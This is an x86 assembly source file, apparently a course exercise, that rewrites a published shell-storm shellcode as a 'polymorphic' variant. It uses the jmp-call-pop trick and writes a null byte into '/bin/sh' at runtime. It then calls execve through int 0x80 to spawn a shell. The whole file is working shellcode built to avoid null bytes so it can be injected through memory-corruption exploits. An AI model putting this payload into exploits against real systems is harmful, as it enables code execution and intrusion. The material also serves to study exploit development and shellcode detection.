; A6 - Polymorphic
; Original - http://shell-storm.org/shellcode/files/shellcode-811.php
; William Moody
; PA-25640
; 31.12.2021

global _start
section .text
_start:
	jmp short call_main

main:
	pop ebx					; EBX = "/bin/shA"
	xor eax, eax 			; EAX = 0
	mov [ebx+7], byte al	; EBX = "/bin/sh\x00"
	mov ecx, eax			; ECX = 0
	mov edx, eax			; EDX = 0
	mov al, 0xb				; EAX = 0xB (SYS_EXECVE)
	int 0x80				; SYS_EXECVE

call_main:
	call main
	filename: db "/bin/shA"
